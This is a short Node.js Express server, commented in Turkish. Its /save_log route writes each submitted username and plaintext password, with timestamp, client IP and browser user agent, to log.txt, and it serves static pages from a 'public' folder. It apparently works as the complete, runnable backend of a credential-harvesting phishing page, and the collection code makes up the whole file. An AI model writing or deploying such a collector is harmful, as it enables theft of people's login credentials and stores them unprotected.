const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();
const port = 3000;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.post('/save_log', (req, res) => {
    const data = req.body;
    console.log('Received data:', data); // Gelen verilerin doğru olup olmadığını kontrol edin.

    const logData = `Tarih: ${new Date().toLocaleString()}, Kullanıcı Adı: ${data.username}, Şifre: ${data.password}, IP Adresi: ${req.ip}, Tarayıcı: ${req.headers['user-agent']}\n`;

    fs.appendFile('log.txt', logData, (err) => {
        if (err) {
            console.error('Veriler kaydedilemedi:', err);
            res.status(500).json({status: 'error', message: 'Veriler kaydedilemedi.'});
        } else {
            console.log('Veriler kaydedildi:', logData);
            res.status(200).json({status: 'success', message: 'Giriş bilgileri kaydedildi.'});
        }
    });
});

app.use(express.static('public'));

app.listen(port, () => {
    console.log(`Sunucu http://localhost:${port} adresinde çalışıyor`);
});
